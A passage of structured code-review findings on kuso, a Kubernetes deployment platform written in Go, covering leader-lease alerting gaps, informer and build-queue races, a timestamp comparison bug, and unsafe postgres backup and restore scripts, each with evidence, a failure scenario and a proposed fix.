fix_sketch: Refuse version changes with the same ErrConflict + backup/delete/recreate message used for ha/storageSize/database (allow no-op re-saves), or at minimum refuse changes that alter the major version for data-dir-versioned kinds (postgres, mysql, mongodb, clickhouse).
verify_reason: addons.go:519-521 applies req.Version into addon.Spec.Version with no guard, inside the very closure that refuses HA (534-536), storageSize (542-544), and database (545-547) with ErrConflict — the HA comment even cites docs/EDIT_SAFETY.md, whose line 57 marks version '❌ No — treat as new addon'. The field is exposed on the wire (handlers/addons.go:56, route comment line 88 advertises 'Edit version'), and every kusoaddon chart consumes it directly as the container image tag (postgres.yaml:7 + image: "postgres:{{ $version }}" at 103/124; postgres-ha CNPG imageName likewise). A major-version PATCH therefore succeeds as a valid StatefulSet pod-template update and crash-loops on the incompatible data directory exactly as claimed; no other guard exists anywhere in the package, handler, or CLI. Severity P1, not P0: no data is destroyed (postgres refuses to start rather than corrupting the PVC, and reverting the version restores service), but it is a production-DB outage triggered by an operation the API surface actively advertises as supported.

title: Webhook/incident fan-out silently dropped when the two leader leases land on different pods
summary: notify.Dispatcher's single isLeader hook is wired to leaderActive, which is flipped only by the "kuso-server-singletons" lease (main.go:617-626, 652-653), but nodewatch/alerts/cronwatch/pkgupdates/backuphealth emit events from under a second, independent lease "kuso-server-cluster-singletons" (main.go:1127-1134); dispatch() (notify.go:414-419) and the outbox workers (outbox.go:279-287) drop fan-out on any pod whose leaderActive is false, so events emitted on the cluster-singletons leader never reach the outbox at all when that pod is not also the singletons leader.
failure_scenario: 2-replica kuso-server: pod A wins lease "kuso-server-singletons" (leaderActive=true on A), pod B wins lease "kuso-server-cluster-singletons" (independent election, ~50% chance per re-election). A node goes NotReady >5min. Pod B's nodewatch cordons it and calls notifyDisp.Emit(node.unreachable). Emit persists to the bell feed, but pod B's dispatch() reads isLeader() -> pod B's leaderActive=false -> returns before EnqueueOutbox, so no outbox row is ever written; pod A never saw the event (the queue is an in-memory channel local to B). The Discord/Slack/webhook alert AND the incidents.Manager eventHook (notify.go:362, also leader-gated) are silently lost for every node.unreachable/node.recovered/alert.fired/cron.failed/backup-health/pkg-update event — exactly the 3am-page class.
evidence: main.go:618 `notifyDisp.SetLeaderHook(func() bool { ... return leaderActive.Load() })` — leaderActive is stored true only inside startSingletons (lock "kuso-server-singletons", main.go:813-816). startKubeSingletons (nodewatch, scaledown, cronwatch, pkgupdates, alerts, backuphealth) runs under a different lock: main.go:1127-1130 `go leader.RunWhenLeader(ctx, leader.Config{ ... LockName: "kuso-server-cluster-singletons" ...})`. notify.go:417 `if leaderFn != nil && !leaderFn() { return }` runs before the EnqueueOutbox loop, so the durable outbox never gets the row.
fix_sketch: Use one lease for both singleton groups, or track per-lease leadership and make the dispatch gate 'this pod holds ANY lease' — better: drop the gate on the enqueue side entirely (enqueue outbox rows unconditionally; the SELECT ... FOR UPDATE SKIP LOCKED drain already prevents double-delivery) and keep the leader gate only on the outbox workers.
verify_reason: Every link traced in code: (1) two independent Lease elections — main.go:813-819 LockName "kuso-server-singletons" runs startSingletons, main.go:1127-1134 LockName "kuso-server-cluster-singletons" runs startKubeSingletons; internal/leader/leader.go wraps client-go leaderelection per LeaseLock with no coupling or re-convergence, so the leases can land on different pods (rolling update, single-lease renew failure, simultaneous scale-up). (2) leaderActive is flipped true only at main.go:653 inside startSingletons (false at 672), and notifyDisp.SetLeaderHook (main.go:618-626) reads only it. (3) startKubeSingletons starts nodewatch/pkgupdates/cronwatch/alerts/backuphealth all wired to notifyDisp; nodewatch calls Notify.Emit at nodewatch.go:262/267. (4) Emit persists the bell-feed row then pushes onto d.ch, an in-memory per-process channel; dispatch (notify.go:414-419) returns on !leaderFn() BEFORE the EnqueueOutbox loop (notify.go:446), and the incidents eventHook is identically gated at notify.go:358-364. So on a pod holding only the cluster-singletons lease, no outbox row is ever written and the other pod never sees the event — webhook fan-out and incident creation are silently lost. No alternate delivery path exists (nothing re-reads NotificationEvent into the outbox). Multi-replica is a supported configuration: deploy/server-go.yaml defaults replicas:1 but its PDB annotation (lines 252-257) explicitly tells operators to scale kuso-server to 2+ before draining a node — precisely the moment node.unreachable alerts matter. P1, not P0: no data loss or authz bypass, bell feed survives, single-replica installs unaffected; but in the documented HA setup the entire out-of-band alerting class (node.unreachable/recovered, alert.fired, cron.failed, backup-health, pkg-updates) drops silently with ~coin-flip probability per lease split, with no error or metric signaling it.

title: buildcontroller DeleteFunc ignores DeletedFinalStateUnknown tombstones, permanently wedging same-name rebuilds
summary: The KusoBuild informer's DeleteFunc only handles *unstructured.Unstructured and silently drops cache.DeletedFinalStateUnknown tombstones, so a delete missed during a watch relist leaves the CR's key in the `running` dedup map forever; a later KusoBuild recreated with the same name (same project/service/SHA, which buildCRName makes deterministic) is then never reconciled — no Job is ever created.
failure_scenario: Leader pod runs for weeks. Build kuso-api-abc123 runs (key added to `running` at reconcile, buildcontroller.go:286). The apiserver watch drops and relists while the retention sweep deletes that CR — the informer delivers cache.DeletedFinalStateUnknown, the type assert at line 157 fails, key stays in `running`. Later a user re-triggers the same commit: Create mints the same CR name, informer fires Add, reconcile hits `if _, already := s.running[key]; already { return }` (line 282) and bails. No Job renders; ResyncActive can't help (it calls the same reconcile). After 30 min the poller's stuck-timeout force-fails the build ("job never appeared"), and every retrigger of that SHA fails the same way until the kuso-server pod restarts.
evidence: buildcontroller.go:156-163: `DeleteFunc: func(obj any) { if u, ok := obj.(*unstructured.Unstructured); ok { ... delete(s.running, key) } }` — no DeletedFinalStateUnknown branch, the standard client-go tombstone pattern is missing.
fix_sketch: In DeleteFunc, unwrap `cache.DeletedFinalStateUnknown` (use its .Obj, or fall back to its .Key) before deriving the map key, mirroring the canonical client-go handler pattern.
verify_reason: The defect is real and the failure path traces exactly: buildcontroller.go:156-163 DeleteFunc only type-asserts *unstructured.Unstructured with no cache.DeletedFinalStateUnknown branch (the only informer DeleteFunc in server-go; the informer is a standard dynamicinformer SharedIndexInformer per kube/cache.go:112,208, which delivers tombstones on relist-detected deletes). running[key] is added at line 286 and on a successful reconcile is removed ONLY by DeleteFunc — so a tombstoned delete strands the key. buildCRName is deterministic for real SHAs (refs.go:34: <project>-<service>-<sha[:12]>), the retention sweep (cleanup.go SweepFinishedBuilds) deletes old CRs in bursts, and kube/crds.go create() is a plain Create — so a re-trigger of the same commit recreates the same name, the Add event hits the dedup at line 282 and returns before ensureJob, no Job renders, ResyncActive calls the same reconcile and can't help, and the poller force-fails after the 30-min stuck timeout (builds.go:1739-1767, message "build job never appeared"). However the claim overstates persistence: the wedge is largely self-healing, not "until pod restart" — after the force-fail the done=true CR blocks further same-SHA Creates with AlreadyExists, and when that CR is later deleted via a healthy watch, DeleteFunc gets a real unstructured and clears the key. Synthetic-ref redeploys (unix-ms suffixed names, builds.go ~604) are never affected; only explicit-SHA/webhook rebuilds of an already-built commit, and only when a watch relist swallowed the delete. Real missing-tombstone bug with a narrow trigger and bounded, mostly self-recovering impact: P2, not P1.

title: scaledown's HPA guard checks an annotation that never exists on Deployments — guard is dead code
summary: The "don't fight the HPA" guard tests dep.Annotations["autoscaling.alpha.kubernetes.io/conditions"], but that annotation is only ever written onto HorizontalPodAutoscaler objects (when an autoscaling/v2 HPA is read through the v1 API) — kuso's kusoenvironment chart renders a plain autoscaling/v2 HPA (operator/helm-charts/kusoenvironment/templates/hpa.yaml:12) and nothing ever stamps that annotation on the Deployment, so hpaManaged is always false and scaledown will zero HPA-managed Deployments despite the package doc stating "scale-to-zero requires autoscaling OFF".
failure_scenario: A service has spec.sleep.enabled=true AND spec.autoscaling.enabled=true (nothing in sleepEligible, scaledown.go:111-120, excludes autoscaled services). The chart omits spec.replicas and an HPA owns scaling. After the idle window, scaledown patches the Deployment to replicas=0 (scaleToZero, line 198-213) and persists replicaCount=0 on the env CR. The HPA controller treats replicas=0 as 'autoscaling disabled by user' and goes dormant; on wake, replica state disagrees with the HPA's min/desired and the env CR now carries a replicaCount the chart never intended to stamp for autoscaled envs. The guard that was written to prevent exactly this never fires. (Same dead check duplicated in server-go/internal/projects/drift.go:494 and :543.)
evidence: scaledown.go:154 `if _, hpaManaged := dep.Annotations["autoscaling.alpha.kubernetes.io/conditions"]; hpaManaged { return }` — grep of the repo shows nothing writing this annotation; the chart's HPA is autoscaling/v2 targeting the Deployment, and Kubernetes only round-trips alpha condition annotations on the HPA object itself, never onto the scale target.
fix_sketch: Detect HPA ownership properly: read the env CR / KusoService spec (Autoscaling.Enabled is already available on the types) or list HPAs whose scaleTargetRef matches the Deployment, instead of probing a phantom annotation. Apply the same fix to projects/drift.go.
verify_reason: The guard at server-go/internal/scaledown/scaledown.go:154 tests dep.Annotations["autoscaling.alpha.kubernetes.io/conditions"] on the Deployment, but a repo-wide grep shows zero writers of that annotation, and Kubernetes only round-trips it onto HPA objects (v2-read-as-v1), never onto the scale target — so hpaManaged is always false and the guard is dead code, as are the identical exemptions at projects/drift.go:494 and :543. The trigger combo is reachable: sleepEligible (scaledown.go:111-120) checks only Sleep.Enabled and WakeOn.ExcludePaths, autoscaling is silently enabled whenever scale.Max > scale.Min (autoscalingFromScale, services_ops.go:1708-1730), and neither AddService nor PatchService cross-validates sleep against scale. The chart confirms the premise the guard was written for: kusoenvironment/templates/deployment.yaml:35-37 omits spec.replicas when autoscaling.enabled and hpa.yaml renders a plain autoscaling/v2 HPA with nothing annotating the Deployment. So an idle sleep+autoscaled service falls through the dead guard, scaleToZero (scaledown.go:198-213) zeroes the HPA-owned Deployment and persists replicaCount=0 on the env CR, and the HPA goes dormant — exactly the fight the package doc says must not happen. Severity is P2, not higher: requires the specific sleep+autoscaling config, the activator wake path still recovers the service, and there is no data loss or security impact; the drift.go side effect is false "replicas" drift reporting on HPA-scaled envs, an annoyance rather than an outage.

title: Per-service build queue TOCTOU: active-check reads lagging informer cache and locks are process-local
summary: Create's queued/active decision (`findActiveForService` under svcLock, builds.go:658-693) reads KusoBuilds through kube.list() which serves from the informer cache when synced (kube/crds.go:47-70), so it is not read-your-writes: a CR created microseconds earlier by the previous Create is invisible until the watch event lands, and the per-service mutex that the comment claims 'closes the TOCTOU window' only serializes within one process — multi-replica installs (serviceLocks and inFlight are struct fields, not shared state) bypass it entirely.
failure_scenario: Monorepo push delivers two webhook builds for the same service ~50ms apart (or one Redeploy click racing a webhook). Create#1 takes svcLock, sees no active build, writes CR#1 (live apiserver write), unlocks. Create#2 takes svcLock before the informer for GVRBuilds has processed CR#1's watch event; findActiveForService (admission.go:250-269 -> ListKusoBuildsByLabels -> cache) returns "", so CR#2 is created without the queued label too. Both CRs carry spec.image, buildcontroller renders BOTH kaniko Jobs concurrently for the same service — the exact parallel-build OOM scenario the queue was built to prevent (per the admitBuild comment about v0.8.9 OOM-thrashing). With 2+ replicas the same double-run happens with any concurrency at all, since each replica has its own serviceLocks map.
evidence: kube/crds.go:47 `if c.Cache != nil && opts.FieldSelector == "" { ... if items, ok := c.Cache.ListFromCache(gvr, namespace, sel); ok { return ... } }` — ListKusoBuildsByLabels (crds.go:171) always goes through this; builds.go:194 comment: "The per-service mutex closes the TOCTOU window between findActiveForService and CreateKusoBuild" — it closes the in-process interleaving but not the stale-read, and nothing closes it across replicas.
fix_sketch: Inside the svcLock critical section, do the active-check with a live (non-cached) LIST or a field-selector list that bypasses the cache; for cross-replica correctness either leader-gate build creation, or make the invariant server-side (e.g. always create queued and let the leader-only dispatcher promote, which it already knows how to do).
verify_reason: The failure path traces exactly as claimed. builds.go:688-693 decides queued/active via findActiveForService (admission.go:250-269) → ListKusoBuildsByLabels (crds.go:171) → list() which serves from the informer cache whenever synced (crds.go:47-71, label-selector-only so always cache-eligible); CreateKusoBuild (crds.go:415, builds.go:900) is a live apiserver write with no cache write-through (cache.go is a stock dynamicinformer factory — grep for Upsert/inject finds nothing) and no post-create sync wait, so the svcLock (builds.go:658, process-local map per serviceLockFor builds.go:345) serializes callers without giving read-your-writes: Create#2 entering right after Create#1's unlock reads a cache that hasn't processed CR#1's watch event and skips the queued label. Every backstop misses this window: inFlight dedup is SHA-keyed (builds.go:613), findRecentForBranch coalescing applies only to synthetic refs with empty req.Ref (builds.go:675), admitBuild counts running build PODS not CRs (admission.go:46,57-107) and CR#1's Job pod won't be rendered yet, supersedePriorBuilds is no longer called from Create (admission.go:307-310), and the dispatcher only promotes queued CRs — no repair for double-active. The multi-replica half also holds: deploy/server-go.yaml ships replicas:1 but explicitly documents scaling to 2+ (PDB hint lines 252-257, 281), Create is not leader-gated (leader election covers singleton loops in cmd/kuso-server/main.go, not HTTP handlers), and serviceLocks/inFlight are struct fields with no cross-replica coordination. Severity corrected to P2: in the default single-replica deployment the window is informer watch latency (milliseconds) requiring two distinct-SHA triggers inside it; consequence is two parallel kaniko builds for one service (resource/OOM pressure, possible out-of-order image promotion) — a real correctness bug the queue was built to prevent, but narrow-trigger, no data loss or security impact, and multi-replica (where the window widens to ~150ms+ of preflight+secret work per Create) is opt-in, not default.

title: markFailed and promoteOne stamp state with unconditional merge-patches that can overwrite a concurrent user Cancel
summary: markSucceeded re-reads the CR to detect a mid-flight Cancel (builds.go:2157-2162), but markFailed performs no such re-read before its terminal MergePatch (builds.go:2332-2338), and promoteOne (builds.go:1719-1726) promotes a queued build from a stale list snapshot with no phase re-check — both can clobber a Cancel that landed between the poller's list and the patch.
failure_scenario: (a) A build is visibly failing; the user clicks Cancel. Cancel stamps phase=cancelled + build-state=done + deletes the Job (lifecycle.go:68-84). Meanwhile the same poller tick already listed the build as in-flight and entered markFailed, which spends several seconds in tailBuildLogLines + pod-list classification (builds.go:2292-2300) before patching phase=failed over phase=cancelled and emitting an error-severity build.failed — which mentionFor defaults to @here (notify.go:554-557). The user gets paged for a build they cancelled, and the archived record says failed. (b) User cancels a QUEUED build in the same 5s tick the dispatcher promotes it: promoteOne's patch removes build-state (Cancel set it to done), stamps phase=pending and spec.image onto a CR whose spec.done=true — buildcontroller skips it (done), no Job renders, observeNamespace now polls it (label was cleared), and 30 minutes later the stuck-timeout force-fails it, emitting a spurious build.failed for a cancelled build.
evidence: builds.go:2332-2338: markFailed's patch `{"metadata":{"annotations":{..."failed"...}},"spec":{"done":true}}` is applied with no fresh GetKusoBuild/phase guard (contrast markSucceeded builds.go:2157). builds.go:1719-1724: promoteOne patch `{"metadata":{"labels":{"kuso.sislelabs.com/build-state":null},"annotations":{..."pending"}},"spec":{"image":...}}` built from the tick's list snapshot, MergePatch with no resourceVersion precondition.
fix_sketch: In markFailed, re-Get the CR and bail if phase is already cancelled (mirror markSucceeded's guard); in promoteOne, re-Get and skip when spec.done=true or phase=cancelled, or switch both to a resourceVersion-preconditioned Update like promoteEnvImageCAS.
verify_reason: Both legs verified in code. (a) markFailed (server-go/internal/builds/builds.go:2277-2341) performs multi-second pre-patch work (tailBuildLogLines at 2292, pod list at 2294) then applies its terminal MergePatch at 2332-2338 stamping phase=failed/build-state=done/spec.done=true with NO fresh GetKusoBuild — in explicit contrast to markSucceeded, which guards this exact race twice (builds.go:2157-2162 with a comment naming the mid-flight-Cancel hazard, and again at 2193-2199 which bails on phase=cancelled). Cancel (lifecycle.go:52-74) only rejects already-terminal builds, so a Cancel landing mid-markFailed succeeds, stamps phase=cancelled, then gets overwritten to failed; the build is archived as "failed" (queueArchive at 2352) and eventBuildFailed fires with Severity:"error" (builds.go:2391), which mentionFor defaults to @here (notify/notify.go:554-556). (b) dispatchQueued lists queued builds via the informer cache (kube/crds.go:46-70 — stale-read prone, widening the window) and promoteOne (builds.go:1719-1726) merge-patches the stale snapshot with no phase re-check and no resourceVersion precondition: it nulls the build-state label Cancel set to "done", stamps phase=pending, and re-sets the image tag Cancel blanked, while leaving spec.done=true. Buildcontroller then skips it (buildcontroller.go:234 `if b.Spec.Done { return }`), no Job renders; observeNamespace re-polls it (label cleared at 1441, phase check at 1447-1449 skips only succeeded/failed), checkBuild hits Job-NotFound, and buildStuckTimeout (30m default, builds.go:1739-1746, force-fail path at 1763-1767) routes it into markFailed → spurious error/@here build.failed for a cancelled build. Severity corrected to P2: the trigger is a narrow same-tick race (seconds-wide, stretched by log tailing and cache staleness), and the blast radius is a false page + mislabeled record + a 30-minute zombie CR — no data loss, no security impact, and no wrong image reaches production (Cancel blanks image.tag and spec.done=true keeps the Job from rendering).

title: Lexicographic promotedAt comparison is unsound across RFC3339Nano formats — stale auto-promote can overwrite a rollback
summary: The last-trigger-wins guard compares annPromotedAt strings with `prev > bTrigger` (builds.go:2507, 2647, 2814), but the two writers use different RFC3339Nano renderings: buildTriggerTimestamp emits whole-second values (CreationTimestamp has 1s resolution → "…T10:00:04Z") while Rollback stamps time.Now() with fractional seconds (lifecycle.go:209 → "…T10:00:04.567Z"); lexicographically '.' (0x2E) < 'Z' (0x5A), so a fractional timestamp compares LESS than a whole-second timestamp in the same second, inverting chronological order — and RFC3339Nano's trailing-zero trimming makes even nano-vs-nano compares unsound ("04.5Z" > "04.51Z").
failure_scenario: Build B is created at 10:00:04 (bTrigger="…04Z") and is still building. At 10:00:04.567 the user rolls production back to an older image; Rollback stamps annPromotedAt="…04.567Z" explicitly so the in-flight auto-promote loses (per the comment at lifecycle.go:204-207). Build B finishes; promoteEnvImageCAS re-reads the env, evaluates `prev("…04.567Z") > bTrigger("…04Z")` → false because '.' < 'Z' → the guard does NOT skip, and the auto-promote overwrites the user's rollback with the image they just rolled away from — the exact scenario the now-stamp was added to prevent.
evidence: builds.go:2470-2475 `buildTriggerTimestamp` formats CreationTimestamp (second resolution) with RFC3339Nano → no fractional part; lifecycle.go:209 `now := time.Now().UTC().Format(time.RFC3339Nano)` → fractional part; builds.go:2507 `if prev := e.Annotations[annPromotedAt]; prev != "" && bTrigger != "" && prev > bTrigger` — plain string compare.
fix_sketch: Parse both sides with time.Parse(time.RFC3339Nano) and compare time.Time values (treating parse failure as no-guard), or normalize all writers to a fixed-width format (RFC3339 with padded nanoseconds) before comparing.
verify_reason: Code trace confirms every element: buildTriggerTimestamp (builds.go:2470-2475) formats metav1 CreationTimestamp (second precision, zero nanos after unstructured decode) with RFC3339Nano, always yielding whole-second strings like "…T10:00:04Z"; Rollback (lifecycle.go:209-215) stamps annPromotedAt with time.Now().UTC().Format(RFC3339Nano), which virtually always has fractional seconds; all three guards (builds.go:2507, 2647, 2814) do a raw string compare `prev > bTrigger` with no parsing (grep confirms no other readers). Within a shared whole second, '.' (0x2E) < 'Z' (0x5A) makes the chronologically-later rollback stamp compare LESS than the build trigger, so the guard fails to skip and promoteEnvImageCAS overwrites the rollback image and restamps annPromotedAt (line 2551) — exactly the scenario the lifecycle.go:202-207 comment says the now-stamp was added to prevent. The CAS retry loop re-runs the same broken guard, so it offers no protection. Two narrowing corrections: (1) the nano-vs-nano trailing-zero unsoundness is unexercised — bTrigger never has a fractional part; (2) even with matching formats the same-second race loses anyway because strict `>` treats a tie as promote, so the real defect is that sub-second precision is discarded/inverted; a correct fix requires parsed-time comparison with >= semantics, not just format alignment. Severity P2: consequence is serious (production silently reverts to the rolled-away image with no self-correction) but the trigger window is one wall-clock second — the rollback must land in the same second the in-flight build CR was created — making it a narrow race rather than a routinely-hit P1.

title: previewdb seedAsync poll loop ignores context cancellation for up to 5 minutes
summary: seedAsync's readiness wait uses bare `time.Sleep(5 * time.Second)` in a wall-clock loop and never checks ctx.Done(), so cancelling BaseCtx (graceful shutdown — the exact case the Cloner.BaseCtx comment says the design exists for) does not stop the loop; with a cancelled ctx every cloneReady kube call fails instantly, and the goroutine hot-spins a failed Secrets.Get + StatefulSets.Get every 5s until the 5-minute deadline expires.
failure_scenario: kuso-server receives SIGTERM while 4 preview-DB clones are waiting for their StatefulSets. workerCtx cancels; each seedAsync goroutine keeps running for up to 5 more minutes (deadline at line 275), issuing doomed kube API calls against the tearing-down client every 5s, delaying clean goroutine unwind past the drain window and generating error noise in the shutdown logs — contradicting the stated contract at previewdb.go:59-63 ("a graceful shutdown cancels in-flight pg_dump pipes instead of leaving detached goroutines").
evidence: previewdb.go:275-281: `for time.Now().Before(deadline) { if c.cloneReady(ctx, ...) { break }; time.Sleep(5 * time.Second) }` — no select on ctx.Done(), unlike the equivalent loops in waitForEnvImage (migrate.go:289-293) and waitForJobComplete (migrate.go:316-320) which do it correctly.
fix_sketch: Replace time.Sleep with `select { case <-ctx.Done(): return; case <-time.After(5 * time.Second): }`, matching migrate.go's wait loops.
verify_reason: The code defect is real: previewdb.go:275-281 polls with bare time.Sleep(5s) and never checks ctx.Done(), unlike the sibling loops in migrate.go (waitForEnvImage ~289, waitForJobComplete ~316) which correctly select on ctx.Done(); this contradicts the BaseCtx contract comment at previewdb.go:59-64. However, the claimed failure scenario is almost entirely defused by main.go's shutdown sequence (main.go:1138-1162): SIGTERM → srv.Shutdown (≤30s) → fixed 30s drain timer → cancelWorkers() → 500ms sleep → process exit. Nothing waits on the seed goroutine (no WaitGroup anywhere in previewdb or main), so after BaseCtx cancels the goroutine survives at most ~500ms — one cloneReady call fails instantly with context.Canceled, it enters time.Sleep(5s), and the process dies mid-sleep. There is no 5-minute spin, no delay to shutdown (fixed timers), and no log noise (cloneReady returns false silently on error, previewdb.go:325-327/336-338; the single "never reached ready" Warn at line 283 can't print before exit). The 30-min seedCtx timeout can't expire during the 5-min readiness window, so shutdown is the only cancellation path this loop observes. Net: a genuine contract/consistency wart deserving a two-line select fix, but with no observable production impact — P3, not the P1-style shutdown-degradation the reviewer described.

title: In-place postgres restore silently no-ops or duplicates data (no --clean dump, no ON_ERROR_STOP)
summary: The postgres restore script pipes the dump into psql without -v ON_ERROR_STOP=1 and without --single-transaction, while every restorable pg backup (CronJob backup-cronjob.yaml:78, snapshot_adapter.go:61, external :231) is produced WITHOUT --clean/--if-exists — so an in-place restore replays CREATE TABLE/COPY onto a live schema, every statement error is swallowed, and psql exits 0.
evidence: registry.go:56-57: `gunzip -c /tmp/dump.sql.gz | PGPASSWORD=... psql -h ... -U ... "${POSTGRES_DB}"` — no ON_ERROR_STOP. backup-cronjob.yaml:78-80: `pg_dump -h ... -U ... "${POSTGRES_DB}" | gzip` — no --clean. Contrast: the previewdb seed job (previewdb.go:516-518) correctly uses `pg_dump --clean --if-exists | psql -v ON_ERROR_STOP=1`. The handler's own comments (backups.go:299-303, 357-364) falsely claim the restore applies a `--clean --if-exists` dump.
failure_scenario: User in-place-restores yesterday's backup after a bad data change (typed confirm, Job runs). Every CREATE TABLE fails 'already exists'; for tables with PKs every COPY fails on duplicate keys, so the live (bad) data is kept; for tables without unique constraints COPY appends, duplicating every row. psql exits 0, the Job goes Complete, the UI/audit report a successful restore. The DB is now a silent mix of un-restored and duplicated data and the user believes the rollback happened.
fix_sketch: Add `--clean --if-exists` (and ideally --no-owner --no-acl) to the pg_dump in backup-cronjob.yaml and snapshot_adapter.go, and run the restore psql with `-v ON_ERROR_STOP=1 --single-transaction` in registry.go so a failed restore fails loudly instead of half-applying. Same for the mysql path if mysqldump defaults are ever overridden.
verify_reason: Every cited line checks out. (1) registry.go:56-57 pipes the dump into psql with no -v ON_ERROR_STOP=1 and no --single-transaction, so psql continues past statement errors and exits 0; the script's `set -eo pipefail` cannot catch it and the restore Job goes Complete. (2) All three producers of restorable postgres artifacts dump WITHOUT --clean/--if-exists: backup-cronjob.yaml:78-80 (plain pg_dump), snapshot_adapter.go:61 (plain pg_dump), backup-cronjob.yaml:231 (external, --no-owner --no-acl only). (3) In-place restore is a supported flow (backups.go:291-304, typed-confirm gate at 357-370) and the Job (backups.go:440-480) runs the RestoreScript directly with no drop/recreate preamble — so the replay hits a live schema: CREATE TABLE fails 'already exists', COPY into PK tables aborts keeping the bad live rows, COPY into unconstrained tables appends duplicates, and setval rewinds sequences. (4) The handler comments at backups.go:299-300 and 358-360 falsely claim a '--clean --if-exists' dump is applied. (5) The correct recipe exists in-repo at previewdb.go:516 (pg_dump --clean --if-exists | psql -v ON_ERROR_STOP=1), confirming the backup path is the outlier. Severity corrected to P1: deterministic silent data corruption via the primary recovery path with a false success signal in Job/UI/audit, but user-initiated and not attacker-exploitable, so not P0.

title: Release-hook gate silently skipped: JobName truncates tag to 12 chars, erasing synthetic-ref nonce
summary: JobName() keeps only the first 12 chars of the image tag; synthetic-ref builds (UI Redeploy / CLI trigger without --ref) tag images as '<branch-slug>-<unixms-base36>' (builds.go:602, refs.go:23-28), so for any branch whose slug is ≥11 chars the uniqueness nonce is fully truncated and every deploy of that env produces the SAME release Job name — Run()'s fast-path (releaserun.go:190-192) then observes the previous succeeded Job and returns Succeeded without running the new build's migrations, and the build poller promotes the un-migrated image.
evidence: releaserun.go:216-218: `short := imageTag; if len(short) > 12 { short = short[:12] }`. builds.go:589-602: synthetic ref = `shortRef(branch) + "-" + unixms36` and refs.go:23-28 uses it verbatim as the tag (only 40-char SHAs are shortened). Branch 'deploy-kuso' (11 chars, known in production per repo memory) yields tag 'deploy-kuso-<nonce>' → short = 'deploy-kuso-' for every build. releaserun.go:190-192: existing Job in any phase is observed instead of creating a new one; TTLSecondsAfterFinished=86400 keeps the stale Job alive 24h.
failure_scenario: Service on branch 'deploy-kuso' has release.command = migration. Deploy #1 at 09:00 runs the migration, Job '<env>-release-deploy-kuso' completes. Dev pushes a commit adding a NOT NULL column migration and clicks Redeploy at 14:00 (synthetic ref). Run() finds the 09:00 Job, returns OutcomeSucceeded instantly; the new image is promoted with its migration never executed; app writes fail or write against the old schema. Inverse case: if deploy #1's hook FAILED, every redeploy for 24h observes the failed Job and can never promote.
fix_sketch: Include a hash of the full tag in the Job name (e.g. sha256(tag)[:10]) instead of a raw 12-char prefix, or keep the tag suffix (the nonce) rather than the prefix for non-SHA tags.
verify_reason: Every link in the claimed chain is real. (1) Synthetic refs: server-go/internal/builds/builds.go:589-603 — any trigger whose ref isn't a 40-char SHA (shaRE, builds.go:490) synthesizes `sha = shortRef(branch)+"-"+strconv.FormatInt(time.Now().UnixMilli(), 36)`; the Create path has no GitHub branch→SHA resolution (comment at builds.go:521: "branch → SHA via GitHub App is Phase 6"; no ResolveBranchSHA call anywhere in internal/builds or handlers), and the coalescing comment at builds.go:662-675 explicitly says UI Redeploy generates synthetic refs. (2) Tag: builds.go:827 sets `spec.Image.Tag = ImageTag(sha)` and refs.go:23-28 returns non-SHA refs verbatim, so tag = '<branch-slug>-<nonce>'. (3) Truncation: releaserun.go:216-218 keeps only imageTag[:12]; for an 11-char slug ('deploy-kuso', known in production per repo memory) the entire nonce is erased, and the trailing '-' is stripped by TrimRight at releaserun.go:232 — every deploy of that env yields the identical Job name '<env>-release-deploy-kuso'. (4) Skip: releaserun.go:190-192 observes an existing Job in ANY phase instead of creating one, so a prior succeeded Job returns OutcomeSucceeded instantly and the poller (builds.go:2681-2716) promotes the new image with its migrations never executed. TTLSecondsAfterFinished=86400 (releaserun.go:288) keeps the stale Job alive 24h, and nothing ever deletes release Jobs (the only Jobs().Delete calls in lifecycle.go:77 and admission.go:351 target kaniko build Jobs) — so the inverse case also holds: one failed hook poisons every redeploy of that env for up to 24h. The bug is actually BROADER than claimed: the nonce is base36 unix-ms (~8 digits) whose leading digits are near-constant — a 10-char slug (e.g. 'production') keeps only the most-significant digit (constant for ~2.5 years), a 9-char slug keeps 2 (~25-day period), an 8-char slug keeps 3 (~17h), so collisions extend well below the claimed ≥11-char threshold. Severity P1, not P0: it is a serious silent correctness failure with a common real-world trigger (UI Redeploy / CLI trigger without --ref on a branch slug ≥~10 chars), causing un-migrated images to be promoted (app-level schema breakage, possible downstream data damage) or a 24h promotion lockout — but it is not an authz bypass, RCE, or direct platform-caused data loss, and webhook/explicit-SHA builds (tag = sha[:12], unique per commit) are unaffected.

title: Backup pipelines run without pipefail — pg_dump/mysqldump failure uploads a truncated backup with a VALID manifest
summary: The postgres (line 64 'set -eu', 78-80), external-postgres (213, 231-233) and mysql (518, 527) backup scripts use only `set -eu` — the pipeline exit status is gzip/aws's, so a pg_dump/mysqldump failure mid-stream (or at connect) yields a truncated or empty dump that is then sha256'd, given a matching manifest, uploaded, and the Job exits 0; the restore-side sha verification passes because the manifest was computed over the already-broken artifact.
evidence: backup-cronjob.yaml:64 `set -eu` then :78-80 `pg_dump ... | gzip > /tmp/dump.gz` (exit status = gzip's); :81-92 then computes SHA of the truncated file and writes the manifest from it. Contrast: the restore scripts (backup/registry.go:37) and the pre-deploy snapshot (cmd/kuso-server/snapshot_adapter.go:55) use `set -eo pipefail`, so the authors rely on pipefail elsewhere but the scheduled backup — the artifact retention depends on — does not have it.
failure_scenario: Nightly pg_dump starts failing (password drift, DB restarting during the cron window, table lock timeout): gzip still exits 0, an empty/truncated .sql.gz + self-consistent manifest is uploaded, the Job is Complete so no failed-Job alert fires. RETENTION_DAYS=14 then prunes the last good dumps. Two weeks later a disk loss leaves only garbage backups; restore 'verifies checksum OK' and applies an empty dump.
fix_sketch: Add `set -o pipefail` (image ships a shell that supports it — restore scripts already use it) or restructure to `pg_dump ... > /tmp/dump.sql && gzip /tmp/dump.sql`, and fail the Job on empty/implausibly-small dumps (e.g. `[ "$BYTES" -gt 1024 ]`).
